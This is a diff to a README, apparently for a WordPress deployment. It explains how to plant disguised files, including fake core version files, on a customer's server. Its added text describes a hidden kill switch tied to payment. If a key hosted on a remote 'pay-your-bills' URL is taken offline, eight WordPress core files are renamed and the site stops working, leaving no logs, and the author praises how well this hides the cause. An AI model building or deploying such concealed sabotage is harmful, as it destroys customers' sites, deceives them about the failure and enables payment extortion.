@@ -47,4 +47,8 @@ Now generate your files... (You will need Docker Desktop, Chocolatey and nodejs 
 `npm run env:install`
 straight after another in powershell or cmd from the root folder of this project
 
-Next Step: Copy the files, 'src/wp-admin/includes/class-torpedo-boat.php', 'src/wp-includes/version.php', 'src/wp-includes/wp-version.php', 'enigma.dest', 'enigma.src', 'enigma.enforce', '<CUSTOMER_ABBR>.enigma.enc' into the folder onto the server where the file 'wp-load.php' resides.
+Next Step: Copy the files, 'src/wp-admin/includes/class-torpedo-boat.php', 'src/wp-includes/version.php', 'src/wp-includes/wp-version.php', 'src/enigma.dest', 'src/enigma.src', 'src/enigma.enforce', 'src/<CUSTOMER_ABBR>.enigma.enc' into the folder onto the server where the file 'wp-load.php' resides.
+
+When Completely Paid: Copy the files 'src/enigma.key' and 'src/enigma.secret' into the same directory on the server
+
+When Problems With Payment: Take the file https://impact-z.one/pay-your-bills/<CUSTOMER_ABBR>/enigma.key offline or change it' content - The next time WordPress gets restarted random core php files are renamed (8 by the number), even without one of those WordPress cannot be started anymore, there are almost no traces to find - neither a log message nor any other output is generated. The resulting error will seem to have nothing to do with the code mentioned above - because the processing will asynchronously be stopped the moment the next request is being tried to be processed - absolutely KILLER MOVE for anyone below HIGHLY ADVANCED Programming Level. The programmer also needs to know about basics of encryption/decryption knowledge and solid knowledge of the PHP Class Syntax
